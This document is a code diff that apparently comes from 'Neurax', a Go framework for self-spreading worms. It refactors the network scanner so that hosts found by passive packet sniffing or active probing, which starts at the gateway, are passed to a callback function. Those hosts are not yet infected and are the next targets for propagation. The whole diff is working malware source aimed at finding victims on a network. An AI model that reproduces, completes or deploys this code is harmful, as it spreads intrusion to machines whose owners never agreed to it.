@@ -479,7 +479,7 @@ func NeuraxReverse() {
 	}
 }
 
-func neurax_scan_passive_single_iface(c chan string, iface string) {
+func neurax_scan_passive_single_iface(f func(string), iface string) {
 	var snapshot_len int32 = 1024
 	timeout := time.Duration(NeuraxConfig.ScanPassiveTimeout) * time.Second
 	if NeuraxConfig.ScanFast {
@@ -497,16 +497,16 @@ func neurax_scan_passive_single_iface(c chan string, iface string) {
 			source := fmt.Sprintf("%s", ip.SrcIP)
 			destination := fmt.Sprintf("%s", ip.DstIP)
 			if source != GetLocalIp() && !IsHostInfected(source) {
-				c <- source
+				go f(source)
 			}
 			if destination != GetLocalIp() && !IsHostInfected(destination) {
-				c <- destination
+				go f(destination)
 			}
 		}
 	}
 }
 
-func neurax_scan_passive(c chan string) {
+func neurax_scan_passive(f func(string)) {
 	current_iface, _ := Iface()
 	ifaces_to_use := []string{current_iface}
 	device_names := []string{}
@@ -519,11 +519,11 @@ func neurax_scan_passive(c chan string) {
 		ifaces_to_use = append(ifaces_to_use, device_names...)
 	}
 	for _, device := range ifaces_to_use {
-		go neurax_scan_passive_single_iface(c, device)
+		go neurax_scan_passive_single_iface(f, device)
 	}
 }
 
-func neurax_scan_active(c chan string) {
+func neurax_scan_active(f func(string)) {
 	targets := []string{}
 	if NeuraxConfig.ScanGatewayFirst {
 		targets = append(targets, GetGatewayIP())
@@ -552,23 +552,23 @@ func neurax_scan_active(c chan string) {
 		fmt.Println("Scanning ", target)
 		if IsHostActive(target) && !IsHostInfected(target) {
 			fmt.Println("Scanned ", target)
-			c <- target
+			go f(target)
 		}
 	}
 }
 
-func neurax_scan_core(c chan string) {
+func neurax_scan_core(f func(string)) {
 	if NeuraxConfig.ScanPassive {
-		neurax_scan_passive(c)
+		neurax_scan_passive(f)
 	} else {
-		neurax_scan_active(c)
+		neurax_scan_active(f)
 	}
 }
 
 //Scans network for new hosts
-func NeuraxScan(c chan string) {
+func NeuraxScan(f func(string)) {
 	for {
-		neurax_scan_core(c)
+		neurax_scan_core(f)
 		time.Sleep(time.Duration(IntervalToSeconds(NeuraxConfig.ScanInterval)))
 	}
 }
